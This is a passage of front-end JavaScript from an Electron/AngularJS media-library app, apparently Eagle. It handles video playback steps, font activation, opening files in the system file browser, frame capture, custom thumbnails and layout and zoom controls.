                        var step = video.duration / 10;
                        if (step >= 5) {
                            video.currentTime += 5; 
                        }
                        else {
                            video.currentTime += step;
                        }
                    }
                }
                else if ($scope.current.ext == 'gif') {
                    $scope.gifViewer.nextFrame();
                }
            }
        };

        $scope.stepBackward = function() {
            if ($scope.isDetailMode) {
                if (VIDEO_TYPES[$scope.current.ext]) {
                    var video = $(".detail-wrap video")[0];
                    if (video) { 
                        var step = video.duration / 10;
                        if (step>= 5) {
                            video.currentTime -= 5; 
                        }
                        else {
                            video.currentTime -= step; 
                        }
                    }
                }
                else if ($scope.current.ext == 'gif') {
                    $scope.gifViewer.prevFrame();
                }
            }
        };

        $scope.increaseVolume = function() {
            var video = $(".detail-wrap video")[0];
            if (video) {
                if (video.volume + 0.05 > 1) {
                    video.volume = 1;
                } else {
                    video.volume += 0.05;
                }
            }
        };

        $scope.decreaseVolume = function() {
            var video = $(".detail-wrap video")[0];
            if (video) {
                if (video.volume - 0.05 < 0) {
                    video.volume = 0;
                } else {
                    video.volume -= 0.05;
                }
            }
        };

        $scope.isFontActivate = function (item) {
            try {
                var key = Object.keys(item.fontMetas.postScriptName)[0];
                var postScriptName = item.fontMetas.postScriptName && item.fontMetas.postScriptName[key];
                return installedFonts[`${postScriptName}_.${item.ext}`];
            }
            catch (err) {
                return false;
            }
        };

        $scope.changeFontDefaultLang = function (items, lang) {
            if (items && items.length > 0) {
                $scope.checkOperationSafety(function () {
                    items.forEach(function (item) {
                        item.fontMetas.preferLng = lang;
                    });
                    ipcRenderer.send('regenerate-thumbnail', items);
                }, 10);
            }
        };

        $scope.renameFontsWithFullName = function (items) {
            if (items && items.length > 0) {
                $scope.checkOperationSafety(function () {
                    var updates = [];
                    var lng = $rootScope.preferences.general.language;
                    var preferLng = 'en';
                    switch (lng) {
                        case 'zh_TW':
                        case 'zh_CN':
                            preferLng = "zh";
                            break;
                        default: 
                            preferLng = "en";
                    }
                    items.forEach(function (item) {
                        if (item && FONT_TYPES[item.ext]) {
                            if (item.fontMetas) {
                                try {
                                    var fontFamily = _.get(item.fontMetas, `fontFamily.${preferLng}`, undefined) || _.get(item.fontMetas, `fontFamily.en`, "");
                                    if (fontFamily && fontFamily.length > 0) {
                                        var originName = item.name;
                                        var newName = fontFamily;
                                        item.name = newName;
                                        item.oldName = originName;
                                        item.newName = newName;
                                        updates.push(item);
                                    }
                                    console.log(fontFamily);
                                }
                                catch (err) {}
                            }
                        }
                    });
                    ayncsImagesChange(updates);
                    hiddenByCurrentFilter(updates);
                    $scope.updateItemsView(items);
                    $scope.calculateImageBinding({}, function () {
                        $scope.rebindRefresh(true);
                        $scope.updateSelection();
                    });
                }, 10);
            }
        };

        $scope.activateFonts = function (items) {
            if (!items || items.length === 0) return;
            if (!fs.existsSync(fontFolder)) {
                fs.mkdirSync(fontFolder);
            }
            items.forEach(function (font) {
                $scope.activateFont(font, {showNotify: false, updateView: false});
            });
            if (process.platform === 'darwin') {
                $scope.updateItemsView(items);
            }
            $scope.notify({ 
                message: $filter('i18n')("notify.fonts.activate", [
                            { "property": "count", "value": items.length }
                        ]),
                duration: 1000
            });
            analytics.event("Font", "Install");
        };

        $scope.activateFont = function (font, {showNotify, updateView}) {
            if (!font) return;
            if (font.activating || font.deactivating) return;
            var name = font.name + "." + font.ext;
            var key = Object.keys(font.fontMetas.postScriptName)[0];
            var postScriptName = font.fontMetas.postScriptName?.[key];
            var fullName = font?.fontMetas?.fullName?.en || font?.fontMetas?.compatibleFullName?.en;
            var folderPath = path.normalize($scope.libraryPath + "/images/" + font.id + ".info/");
            var rawPath = path.normalize(folderPath + name);
            var outPath = `${fontFolder}/${postScriptName}.${font.ext}`;
            if (process.platform === 'darwin') {
                if (!fs.existsSync(outPath)) {
                    fse.copySync(rawPath, outPath);
                    installedFonts[`${postScriptName}_.${font.ext}`] = true;
                    eagle.filter.filterCounts['fontActivated']['activated']++;
                    eagle.filter.filterCounts['fontActivated']['deactivated']--;
                }
                if (updateView) {
                    $scope.updateItemsView([font]);
                }
            }
            else {
                ipcRenderer.send("activate-windows-font", {
                    fontId: font.id,
                    fontName: font.name,
                    postScriptName: sanitize(postScriptName),
                    fullName: fullName ?? sanitize(postScriptName),
                    fontExt: font.ext,
                    fontPath: rawPath
                });
                font.activating = true;
                $scope.updateItemsView([font]);
            }

            ipcRenderer.send('electron-info', `[app] Install font: ${rawPath}`);
            analytics.event("Font", "Install");

            if (showNotify) {
                $scope.notify({
                    message: $filter('i18n')("notify.font.activate", [
                            { "property": "name", "value": font.name }
                        ]),
                    duration: 1000
                });
            }
        };

        $scope.deactivateFonts = function (items) {
            if (!fs.existsSync(fontFolder)) { return; }
            items.forEach(function (font) {
                $scope.deactivateFont(font, {showNotify: false, updateView: false});
            });
            if (process.platform === 'darwin') {
                $scope.updateItemsView(items);
            }

            $scope.notify({
                message: $filter('i18n')("notify.fonts.deactivate", [
                            { "property": "count", "value": items.length }
                        ]),
                duration: 1000
            });
            analytics.event("Font", "Uninstall");
        };

        $scope.deactivateFont = function (font, {showNotify, updateView}) {
            if (!font) return;
            if (font.activating || font.deactivating) return;
            var key = Object.keys(font.fontMetas.postScriptName)[0];
            var name = font.name + "." + font.ext;
            var postScriptName = font.fontMetas.postScriptName?.[key];
            var fullName = font?.fontMetas?.fullName?.en || font?.fontMetas?.compatibleFullName?.en;
            var outPath = `${fontFolder}/${postScriptName}.${font.ext}`;
            var folderPath = path.normalize($scope.libraryPath + "/images/" + font.id + ".info/");
            var rawPath = path.normalize(folderPath + name);
            if (process.platform === 'darwin') {
                if (fs.existsSync(outPath)) {
                    fse.removeSync(`${fontFolder}/${postScriptName}.${font.ext}`);
                    installedFonts[`${postScriptName}_.${font.ext}`] = false;
                    eagle.filter.filterCounts['fontActivated']['activated']--;
                    eagle.filter.filterCounts['fontActivated']['deactivated']++;
                }
                if (updateView) {
                    $scope.updateItemsView([font]);
                }
            }
            else {
                ipcRenderer.send("deactivate-windows-font", {
                    fontId: font.id,
                    fontName: font.name,
                    fontPath: rawPath,
                    postScriptName: postScriptName,
                    fullName: fullName,
                    fontExt: font.ext
                });
                font.deactivating = true;
                $scope.updateItemsView([font]);
            }

            ipcRenderer.send('electron-info', `[app] Unstall font: ${rawPath}`);
            analytics.event("Font", "Uninstall");

            if (showNotify) {
                $scope.notify({
                    message: $filter('i18n')("notify.font.deactivate", [
                            { "property": "name", "value": font.name }
                        ]),
                    duration: 1000
                });
            }
        };

        $scope.openWithOther = _.debounce(function () {
            if ($scope.selected.length > 0) {
                ipcRenderer.send('open-with-dialog', FileUrlHelper.getRawPath($scope.selected[0]));
            }
        }, 200, true);

        $scope.openItemLocation = function (item, folder) {
            $scope.quickOpenFolder(folder, item);
        };

        $scope.openInFinder = _.debounce(function () {

            // 禁止在任何 Modal 开启时，使用这个功能，避免快捷键冲突
            if ($(".modal.open, .import-modal.open").length > 0) return;
            if (!$scope.selected.length) return;

            var btnLable;

            if (process.platform === 'win32') {
                btnLable = i18n.__("dialog.openInFinder.openExplorerBtn");
            }
            else {
                btnLable = i18n.__("dialog.openInFinder.openFinderBtn");
            }

            if (showFinderAlert) {
                swal({
                    html: `
                        <div class="alert">
                            <div class="alert-icon warning"></div>
                            <h4 class="alert-title">${i18n.__("dialog.openInFinder.title")}</h4>
                            <p class="alert-desc">${i18n.__("dialog.openInFinder.desc")}</p>
                        </div>
                    `,
                    showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                    width: 400,
                    customClass: "alert-box",
                    input: 'checkbox',
                    inputValue: 0,
                    inputValidator: function (result) {
                        return new Promise(function (resolve, reject) {
                            resolve(result);
                        })
                    },
                    inputPlaceholder: i18n.__('general.askagain'),
                    cancelButtonColor: "#777777",
                    confirmButtonText: btnLable,
                    cancelButtonText: i18n.__("general.cancel"),
                }).then(function (result) {
                    showFinderAlert = (result === 0);
                    if (!showFinderAlert) {
                        localStorage.setItem("eagle.hint.showInFinder", showFinderAlert);
                    }
                    openInFinder();
                });
            }
            else {
                openInFinder();
            }

            
        }, 200, true);

        function openInFinder () {
            if ($scope.selected.length > 0) {
                $scope.checkOperationSafety(function () {
                    $scope.selected.forEach(function (file, index) {
                        if (index > 30) return;
                        var folderPath = path.normalize($scope.libraryPath + "/images/" + file.id + ".info/");
                        var rawPath = path.normalize(folderPath + file.name + "." + file.ext);
                        if (fs.existsSync(rawPath)) {
                            ipcRenderer.send('show-item-in-folder', rawPath);
                        }
                        else if (fs.existsSync(folderPath + 'metadata.json')) {
                            ipcRenderer.send('show-item-in-folder', folderPath + 'metadata.json');
                        }
                        else {
                            ipcRenderer.send('show-item-in-folder', folderPath);
                        }
                        electronLog && electronLog.info("[app] Open item inFinder: " + folderPath);
                    });
                }, 10);
            }
        };

        $scope.setAsVideoThumbnail = function() {
            if ($scope.current) {
                var currentTime = $(".detail-wrap video")[0].currentTime;
                var date = new Date(null);
                date.setSeconds(currentTime);
                $scope.current.thumbnailAt = currentTime;
                IPCHelper.send('regenerate-video-thumbnail', {
                    video: $scope.current,
                    startAt: currentTime
                });
            }
        };

        $scope.saveVideoFrame = function () {
        	$scope.videoScreenShot();
        };

        $scope.copeVideoFrame = function () {
        	$scope.videoScreenShot(true);
        };

        $scope.videoScreenShot = function (copyMode) {
            if ($scope.current && VIDEO_TYPES[$scope.current.ext]) {

            	var video = $(".detail-wrap video")[0];
            	var currentTime = video.currentTime;
            	var canvas = document.createElement('canvas');
	            var ctx = canvas.getContext('2d');
	            var width = $scope.current.width;
	            var height = $scope.current.height;

	            canvas.width = width;
	            canvas.height = height;

	            video.setAttribute("crossOrigin", 'Anonymous')
	            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

	            var base64 = canvas.toDataURL("image/jpeg", 0.95);

	            if (copyMode) {
	            	try {
		            	var nativeImage = electron.nativeImage;
		            	var newImage = nativeImage.createFromDataURL(base64);

		            	clipboard.writeImage(newImage);
		            	$scope.notify({
			                message: i18n.__("previewWindow.copied"),
			                duration: 750
			            });
		            }
		            catch (err) {
		            	electronLog && electronLog.error(err.stack || err);
		            }
	            }
	            else {
		            var data = {
	                    id: guid(),
	                    name: `${$scope.current.name} - ${currentTime.toFixed(2)}`,
	                    url: $scope.current.url || "",
	                    tags: [],
	                    modificationTime: $scope.current.modificationTime + 1 || Date.now(),
                        folders: $scope.current.folders || [],
	                    base64data:  base64,
	                };
		            ipcRenderer.sendTo(backgroundWindowID, 'screencapture-from-extension', data);
		        }
            }
        };

        $scope.openFileWithDefault = _.debounce(function(file) {
            if (!file || !file.id) return;
            if ($(".swal2-container").length > 0) { return; }
            var folderPath = path.normalize($scope.libraryPath + "/images/" + file.id + ".info/");
            var rawPath = path.normalize(folderPath + file.name + "." + file.ext);
            ipcRenderer.send('open-with-default', rawPath);
            RecentFileManager.addFile(file);
        }, 500, true);

        $scope.openFilesWithDefault = _.debounce(function(files) {
            if ($(".swal2-container").length > 0) { return; }
            $scope.checkOperationSafety(function () {
                files.forEach(function (file, index) {
                    if (!file || !file.id) return;
                    if (index < 40) {
                        var folderPath = path.normalize($scope.libraryPath + "/images/" + file.id + ".info/");
                        var rawPath = path.normalize(folderPath + file.name + "." + file.ext);
                        ipcRenderer.send('open-with-default', rawPath);
                    }
                });
                RecentFileManager.addFiles(files);
            }, 10);
        }, 500, true);

		$scope.regenerateThumbnail = function () {
			$scope.selected.forEach(function(image) {
				$scope.regenerateThumbnailQueue.push(image);
			});
			ayncsImagesGenerateThumbnail($scope.selected);
		};

        $scope.setCustomThumbnail = function () {
            let item = $scope.selected[0];
            if (!item || NOT_SUPPORT_CUSTEOM_THUMBNAIL_TYPES[item.ext]) return;
            dialog.showOpenDialog(currentWindow, {
                title: "Choose thumbnail",
                filters: [
                    { name: 'Images', extensions: ['jpg', 'jpeg', 'png', 'bmp', 'webp'] },
                ],
                properties: ['openFile']
            }).then(result => {
                let paths = result.filePaths;
                if (!paths || paths.length === 0) return;
                let filePath = paths[0];
                let stat = fs.statSync(filePath);

                // 检查文件大小、尺寸，超过进行警告
                if (stat.size > 10000000) {
                    swal({
                        html: `
                            <div class="alert">
                                <div class="alert-icon error"></div>
                                <h4 class="alert-title">Exceed the Maximum File Size</h4>
                                <p class="alert-desc">The file has not been added for it exceeds the maximum file size of 10MB.</p>
                            </div>
                        `,
                        showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                        width: 400,
                        customClass: "alert-box",
                        cancelButtonColor: "#777777",
                        confirmButtonText: i18n.__("general.ok"),
                        cancelButtonText: i18n.__("general.cancel"),
                    }).then(function () {});
                    return;
                }
                
                ipcRenderer.sendTo(backgroundWindowID, 'set-custom-thumbnail', {
                    item: item,
                    thumbnailPath: filePath
                });

            }).catch(err => {})
        };

        $scope.setCustomThumbnailFromClipboard = async () => {
            let item = $scope.selected[0];
            if (!item || NOT_SUPPORT_CUSTEOM_THUMBNAIL_TYPES[item.ext]) return;
            let newFilePath = `${EAGLE_THUMBNAIL_TEMP_PATH}/${guid()}.png`;
            let clipboardData = await getClipboardImage();
            let filePath = clipboardData?.files[0];
            let image = clipboardData.image;
            
            if (filePath) {
                try {
                    let ext = getExt({path: filePath});
                    let support_ext = { jpg: true, png: true, gif: true, bmp: true, webp: true };
                    if (support_ext[ext]) {
                        fse.copySync(filePath, newFilePath);
                        ipcRenderer.sendTo(backgroundWindowID, 'set-custom-thumbnail', {
                            item: item,
                            thumbnailPath: newFilePath
                        });
                        return;
                    }
                }
                catch (err) {}
            }
            
            if (image) {
                let buffer = image.toPNG(100);
                fs.writeFileSync(newFilePath, buffer);
                ipcRenderer.sendTo(backgroundWindowID, 'set-custom-thumbnail', {
                    item: item,
                    thumbnailPath: newFilePath
                });
            }
        };

        $scope.quicklook = function(event) {
            if ($(".swal2-container").length > 0) {
                return;
            }
            if ($scope.isCropMode) return;
            event && event.preventDefault();
            if ($scope.isDetailMode && !$scope.isInlineMode && VIDEO_TYPES[$scope.current.ext]) {
                $scope.toggleVideoPlay();
            }
            else if ($scope.isDetailMode && !$scope.isInlineMode && AUDIO_TYPES[$scope.current.ext]) {
                $scope.toggleVideoPlay();
            }
            else if ($scope.isDetailMode && !$scope.isInlineMode && ($scope.current.ext == 'gif')) {
                $scope.toggleGifPlay();
            }
            else {
                // 如果用户设定是预览
                if ($rootScope.preferences.habits.keyspace === "preview") {
                    if ($scope.selected.length > 0) {
                        $(".content-panel.detail-mode").addClass("inline-mode");
                        setTimeout(function () {
                            $(".content-panel.detail-mode").addClass("open");
                        }, 30);
                        $scope.toggleDetailMode(event, true);
                        analytics.event('QuickLook', 'Open');
                    }
                }
                else if ($rootScope.preferences.habits.keyspace === "preview-native") {
                    if ($scope.selected.length > 0) {
                        if (process.platform == 'darwin' && !$scope.isDetailMode) {
                            $scope.isPreviewing = !$scope.isPreviewing;
                            IPCHelper.send('quicklook', $scope.selected[0]);
                        }
                    }
                }
                // 如果用户设定是滚动页面
                else {
                    $scope.pageDownHandler(event);
                }
            }
        };

        $scope.maximize = function() {
            if (process.platform == 'darwin') {
                var isMax = remote.systemPreferences.getUserDefault("AppleActionOnDoubleClick", "string") !== 'Minimize';
                if (isMax) {
                    if (!currentWindow.isMaximized()) {
                        currentWindow.maximize();
                        $scope.isMaximize = true;
                    } else {
                        currentWindow.unmaximize();
                        $scope.isMaximize = false;
                    }
                } else {
                    currentWindow.minimize();
                }
            }
        };

        $scope.cancelEmptyTrash = () => {
            $scope.isCleaningTrash = false;
            $scope.trashRemoved = 0;
            $scope.currentTrashRemoved = 0;
            IPCHelper.send('palette-resume');
            IPCHelper.sendTo(backgroundWindowID, 'cancel-empty-trash');
        };

        // 移除所有正在處理的任務
        $scope.cancelAllTasks = function() {
            $scope.uploadQueue = [];
            $scope.finishQueue = [];

            IPCHelper.send('cancel.all');
            // 讓 Palette Queue 繼續
            setTimeout(function () {
                IPCHelper.send('palette-resume');

                // 针对尚未分析颜色的图片，进行颜色分析
                var images = [];
                var ONE_DAY = 1000 * 60 * 60 * 24;
                var now = Date.now();
                for (var rindex = 0; rindex < $scope.raw.length; rindex++) {
                    var image = $scope.raw[rindex];
                    // 不需要判断超过 1 天的图片
                    if (now - image.modificationTime > ONE_DAY) { break; }
                    if (image.hasOwnProperty("processingPalette") && !image.palettes) {
                        images.push(image);
                    }
                }
                console.log(`发现 ${images.length} 张图片需要刷新缩略图, 省略了 ${$scope.raw.length - rindex} 次判断`);
                if (images.length > 0) {
                    ipcRenderer.send('check.image.palette', images);
                }

                if (currentWindow && !currentWindow.isDestroyed()) {
                    currentWindow.setProgressBar(-1);
                }
            }, 1000);
            $("#upload-queue-progress").removeClass("open");
            $("body").removeClass("is-uploading");
        };

        $scope.$watch("viewMode", function(n, o) {
            setViewMode(n);
        });

        $scope.$watch("folderKeyword", function () {
            $scope.updateSidebarList();
        });

        $scope.$watch("keyword", (newValue) => {
            $scope.search(newValue);
        });

        var checkListItemsLessThanContainerTimeout;
        $scope.checkListItemsLessThanContainer = function () {
            if (!ig) return;
            if (ig.getItems().length < 180) {
                clearTimeout(checkListItemsLessThanContainerTimeout);
                checkListItemsLessThanContainerTimeout = setTimeout(function () {
                    console.log("checkListItemsLessThanContainer");
                    // 如果列表尺寸很小，一次載入兩頁
                    var boxList = $("#box-container .box-list")[0];
                    if (boxList && boxList.style) {
                        var boxListHeight = parseInt(boxList.style.height);
                        if (boxListHeight < $("#box-container").height()) {
                            ig.trigger("append");
                            setTimeout(function () {
                                $scope.showImages();
                            }, 100);
                        }
                    }
                }, 500);
            }
        };

        $scope.updateSubFolderWidth = function () {
            if (!$("#box-container")[0]) return;
            var containerWidth = $("#box-container")[0].clientWidth;
            var column = parseInt(containerWidth / $scope.imageSize.height);
            if (!column) column = 1;
            var result = parseInt((containerWidth - 38 - (column * 10)) / column);
            result = parseInt(result / 5) * 5;
            if (result < 90) result = 90;
            if (result >= $scope.MAX_LIST_WIDTH) {
                result = $scope.MAX_LIST_WIDTH;
            }
            $scope.imageSize.subfolderWidth = result;
        };

        $scope.updateSliderPosition = function () {
            // var $breadcrumbs = $(".content-panel .toolbar .breadcrumbs ul");
            // var $right = $(".content-panel .toolbar .right:visible");
            // var $slider = $(".sliders-bar:visible");

            // if ($slider.length === 0 || $right.length === 0 || $breadcrumbs.length === 0) return;

            // var x1 = $slider.offset().left + $slider.width();
            // var x2 = $right.offset().left;

            // var x3 = $slider.offset().left;
            // var x4 = $breadcrumbs.offset().left + $breadcrumbs.width();

            // if ( x1 + 5 > x2 || x4 + 5 > x3 ) {
            //     $slider.addClass("response");
            // }
            // else {
            //     $slider.removeClass("response");
            // }
        };

        var updateListHeightTimeout;
        var updateListHeight = function (height) {
            clearTimeout(updateListHeightTimeout);
            updateListHeightTimeout = setTimeout(function () {
                $("#box-container").attr("box-size", height);
            }, 50);
        }

        var saveListHeightTimeout;
        var saveListHeight = function (height) {
            clearTimeout(saveListHeightTimeout);
            saveListHeightTimeout = setTimeout(function() {
                if ($scope.currentFolder) {
                    localStorage.setItem("eagle.list.thumbSize." + $scope.currentFolder.id, height);
                } else if ($scope.currentSmartFolder) {
                    localStorage.setItem("eagle.list.thumbSize." + $scope.currentSmartFolder.id, height);
                } else if ($scope.currentTag) {
                    localStorage.setItem("eagle.list.thumbSize." + $scope.currentTag, height);
                } else if ($scope.viewMode === 'all') {
                    localStorage.setItem("eagle.list.thumbSize.all", height);
                } else if ($scope.viewMode === 'unfiled') {
                    localStorage.setItem("eagle.list.thumbSize.unfiled", height);
                } else if ($scope.viewMode === 'untagged') {
                    localStorage.setItem("eagle.list.thumbSize.untagged", height);
                } else if ($scope.viewMode === 'trash') {
                    localStorage.setItem("eagle.list.thumbSize.trash", height);
                } else if ($scope.viewMode === 'random') {
                    localStorage.setItem("eagle.list.thumbSize.random", height);
                } else if ($scope.viewMode === 'recent') {
                    localStorage.setItem("eagle.list.thumbSize.recent", height);
                }
            }, 150);
        }

        var changeListHeightTimeout;
        $scope.changeListHeight = function(height) {

            if (!height) height = $scope.imageSize.height;
            if (angular.isNumber(height) && height > 0) {

                height = parseInt(height / 5) * 5;

                $scope.lastImageHeight = $scope.imageSize.height;

                clearTimeout(changeListHeightTimeout);
                changeListHeightTimeout = setTimeout(function() {
                    if ($scope.currentFolder) {
                        localStorage.setItem("eagle.list.thumbSize." + $scope.currentFolder.id, height);
                    } else if ($scope.currentSmartFolder) {
                        localStorage.setItem("eagle.list.thumbSize." + $scope.currentSmartFolder.id, height);
                    } else if ($scope.currentTag) {
                        localStorage.setItem("eagle.list.thumbSize." + $scope.currentTag, height);
                    } else if ($scope.viewMode === 'all') {
                        localStorage.setItem("eagle.list.thumbSize.all", height);
                    } else if ($scope.viewMode === 'unfiled') {
                        localStorage.setItem("eagle.list.thumbSize.unfiled", height);
                    } else if ($scope.viewMode === 'untagged') {
                        localStorage.setItem("eagle.list.thumbSize.untagged", height);
                    } else if ($scope.viewMode === 'trash') {
                        localStorage.setItem("eagle.list.thumbSize.trash", height);
                    } else if ($scope.viewMode === 'random') {
                        localStorage.setItem("eagle.list.thumbSize.random", height);
                    } else if ($scope.viewMode === 'recent') {
                        localStorage.setItem("eagle.list.thumbSize.recent", height);
                    }
                }, 500);

                $("#box-container").attr("box-size", height);
                $scope.relayout();
                setTimeout(function () {
                    showImages();
                }, 200);

                $scope.scrollToCurrentItem();
            }
        };

        $scope.switchLayoutOtpions = function (layoutOptions) {
            localStorage.setItem("eagle.list.layout.options", layoutOptions);
            $scope.layoutOptions = layoutOptions;
        };

        $scope.switchLayout = function (layout, forceLayout) {
            var $container = $("#box-container");
            var allLayout = "grid-layout justified-layout list-layout";
            switch (layout) {
                case "GridLayout":
                    requestAnimationFrame(() => {
                        $("body").removeClass("is-square-layout is-list-layout");
                    });
                    $scope.layout = "GridLayout";
                    $container.removeClass(allLayout).addClass("grid-layout");
                    $scope.relayout();
                    $scope.adjustLayoutWidth(0);
                    electronLog && electronLog.info("[app] Layout: Waterfall");
                    break;
                case "SquareLayout":
                    requestAnimationFrame(() => {
                        $("body").removeClass("is-square-layout is-list-layout");
                        $("body").addClass("is-square-layout");
                    });
                    $scope.layout = "SquareLayout";
                    $container.removeClass(allLayout).addClass("grid-layout");
                    $scope.relayout();
                    $scope.adjustLayoutWidth(0);
                    electronLog && electronLog.info("[app] Layout: Grid");
                    break;
                case "ListLayout":
                    requestAnimationFrame(() => {
                        $("body").removeClass("is-square-layout is-list-layout");
                        $("body").addClass("is-list-layout");
                    });
                    $scope.layout = "ListLayout";
                    $container.removeClass(allLayout).addClass("list-layout");
                    $scope.relayout();
                    electronLog && electronLog.info("[app] Layout: List");
                    break;
                default:
                    requestAnimationFrame(() => {
                        $("body").removeClass("is-square-layout is-list-layout");
                    });
                    $scope.layout = "JustifiedLayout";
                    $container.removeClass(allLayout).addClass("justified-layout");
                    $scope.relayout();
                    electronLog && electronLog.info("[app] Layout: Justified");
            }
            
            $scope.offsetScrollbar(30);
            $rootScope.initMenu();
        }

        $scope.adjustLayoutWidth = function (increases) {

            if (!$scope.isItemBindCalculated) return;
            
            increases = increases || 0;
            var height;
            $scope.boxContianerWidth = $("#box-container").width() || $scope.boxContianerWidth;
            $scope.boxContianerHeight = $("#box-container").height() || $scope.boxContianerHeight;
            if ($scope.layout === "GridLayout" || $scope.layout === "SquareLayout") {
                if (!ig._layout._columnLength) return;
                var containerWidth = $("#box-container").width() || $scope.boxContianerWidth;
                containerWidth = containerWidth - 16 - 10 - 6;
                var currentColumn = ig._layout._columnLength;
                var newColumn = (currentColumn + increases) || 1;
                var newHeight = parseInt( ((containerWidth - 10 * (newColumn + 1))) / newColumn );
                height = Math.floor(newHeight / 5) * 5;
                if (height > $scope.MAX_LIST_WIDTH) height = $scope.MAX_LIST_WIDTH;
            }
            else {
                let step = 50;
                if ($scope.imageSize.height > 500) {
                    step = 100;
                }
                else if ($scope.imageSize.height < 200) {
                    step = 25;
                }
                height = parseInt(($scope.imageSize.height + (step * -increases) ) / 5) * 5;
            }
            if (height > $scope.MAX_LIST_WIDTH) height = $scope.MAX_LIST_WIDTH;
            if (height < 75) height = 75;
            $scope.imageSize.height = parseInt(height);

            if (!height) height = $scope.imageSize.height;
            if (angular.isNumber(height) && height > 0) {
                $scope.lastImageHeight = $scope.imageSize.height;
                $("#box-container").attr("box-size", height);
                var margin = Math.floor((containerWidth % height) / (parseInt(containerWidth / height) - 1) );
                if (margin === Infinity) margin = 10;
                $scope.relayout(margin);
                setTimeout(function () {
                    showImages();
                }, 200);

                $scope.scrollToCurrentItem();
            }
        };

        $scope.zoomIn = function(event) {
            event && event.preventDefault && event.preventDefault();
            if (!$scope.isDetailMode) {
                $scope.adjustLayoutWidth(-1);
                saveListHeight($scope.imageSize.height);
            } else {
                var ratio = Math.ceil($scope.imageSize.zoomRatio / 5) * 5;
                var ratioExp = $scope.getRatioExp(ratio);
                if (ratioExp >= 400) { ratioExp = 800; } else if (ratioExp >= 200) { ratioExp = 400; } else if (ratioExp >= 100) { ratioExp = 200; } else if (ratioExp >= 50) { ratioExp = 100; } else if (ratioExp >= 25) { ratioExp = 50; } else if (ratioExp >= 10) { ratioExp = 25; } else if (ratioExp >= 5) { ratioExp = 10; } else { ratioExp = 5; }
                if (ratioExp > 800) ratioExp = 800;
                $scope.imageSize.zoomRatio = $scope.getRatioNonExp(ratioExp);
                $scope.imageSize.zoomRatioExp = $scope.getRatioExp($scope.imageSize.zoomRatio);
                $scope.updateZoomRatio(undefined, undefined, undefined, true);
            }
        };

        $scope.zoomOut = function(event) {
            event && event.preventDefault && event.preventDefault();
            if (!$scope.isDetailMode) {
                $scope.adjustLayoutWidth(1);
                saveListHeight($scope.imageSize.height);
                $scope.checkListItemsLessThanContainer();
            } else {
                var ratio = Math.floor($scope.imageSize.zoomRatio / 5) * 5;
                var ratioExp = $scope.getRatioExp(ratio);
                if (ratioExp <= 10) { ratioExp = 5; } else if (ratioExp <= 25) { ratioExp = 10; } else if (ratioExp <= 50) { ratioExp = 25; } else if (ratioExp <= 100) { ratioExp = 50; } else if (ratioExp <= 200) { ratioExp = 100; } else if (ratioExp <= 400) { ratioExp = 200; } else if (ratioExp <= 800) { ratioExp = 400; }
                $scope.imageSize.zoomRatio = $scope.getRatioNonExp(ratioExp);
                $scope.imageSize.zoomRatioExp = $scope.getRatioExp($scope.imageSize.zoomRatio);
                $scope.updateZoomRatio(undefined, undefined, undefined, true);
            }
        };

        $scope.zoomActual = function(event) {
            event && event.preventDefault && event.preventDefault();
            if (!$scope.isDetailMode) {
                $scope.imageSize.height = 150;
                $scope.changeListHeight();
                if ($scope.layout === "GridLayout" || $scope.layout === "SquareLayout") { 
                    $scope.adjustLayoutWidth(0);
                    saveListHeight($scope.imageSize.height);
                }
            } else {
                $scope.imageSize.zoomRatio = 100;
                $scope.imageSize.zoomRatioExp = $scope.getRatioExp($scope.imageSize.zoomRatio);
                $scope.updateZoomRatio(100, undefined, undefined, true);

                // 如果是視頻格式，尽可能使用视频原来尺寸
                var $video = $(".detail-wrap video");
                if ($video.length > 0) {
                    var w = $video[0].videoWidth;
                    var h = $video[0].videoHeight;
                    $video.css({
                        'max-width': `${w}px !important`,
                        'max-height': `${h}px !important`,
                    });
                    $video.addClass("fit");
                }
            }
        };

        $scope.zoomFit = function(event, noAnimation) {
            event && event.preventDefault && event.preventDefault();
            if (!$scope.isDetailMode) {
                $scope.imageSize.height = 150;
                $scope.changeListHeight();
                if ($scope.layout === "GridLayout" || $scope.layout === "SquareLayout") { 
                    $scope.adjustLayoutWidth(0);
                    saveListHeight($scope.imageSize.height);
                }
            } else {
                if ($scope.VIDEO_TYPES[$scope.current.ext]) {
                    // 如果是視頻格式，称满画面
                    var $video = $(".detail-wrap video");
                    if ($video.length > 0) {
                        $video.removeClass("fit");
                    }
                    return;
                }
                $scope.zoomFitSize = 0;
                $scope.lastZoomMode = "fit";
                localStorage["eagle.viewer.lastZoomMode"] = $scope.lastZoomMode;
                $scope.imageSize.zoomRatio = 100;
                $scope.imageSize.zoomRatioExp = $scope.getRatioExp($scope.imageSize.zoomRatio);

                if (!noAnimation) {
                    $("#detail-container").addClass("zooming");
                    setTimeout(function () {
                        $("#detail-container").removeClass("zooming");
                    }, 300);
                }

                $scope.smartZoom(undefined, true);
            }
        };

        $scope.toggleZoom = function (event) {
            if (!$scope.isDetailMode) return;
            if ($scope.VIDEO_TYPES[$scope.current.ext]) {
                if ($scope.lastZoomMode !== "edge") {
                    $scope.zoomFit(event);
                    $scope.lastZoomMode = "edge";
                    $scope.zoomFitSize = $scope.imageSize.zoomRatioExp;
                }
                else {
                    $scope.zoomActual(event);
                    $scope.lastZoomMode = "fit";
                    $scope.zoomFitSize = 0;
                }
            }
            else {
                if ($scope.lastZoomMode !== "edge") {
                    $scope.zoomFitEdge(event, true);
                    $scope.lastZoomMode = "edge";
                }
                else {
                    $scope.zoomFit(event);
                    $scope.lastZoomMode = "fit";
                }
            }
            localStorage["eagle.viewer.lastZoomMode"] = $scope.lastZoomMode;
        }

        $scope.zoomFitSize = 0;
        $scope.zoomFitEdge = function(event, hasTransition) {
            event && event.preventDefault && event.preventDefault();

            if (hasTransition) {
                $("#detail-container").addClass("zooming");
                setTimeout(function () {
                    $("#detail-container").removeClass("zooming");
                }, 300);
            }

            var current = $scope.current;
            var ratio = $scope.imageSize.zoomRatio || 100;
            var lastRatio = ratio;
            var $container = $(".content-panel");
            var toolbarHeight = 40;
            var containerWidth;
            var containerHeight;
            var offsetY = 0;
            
            if ($scope.isSlideshowMode) {
                toolbarHeight = 0;
                containerWidth = $(window).width();
                containerHeight = $(window).height() - toolbarHeight;
            }
            else if ($scope.isInlineMode) {
                toolbarHeight = 96;
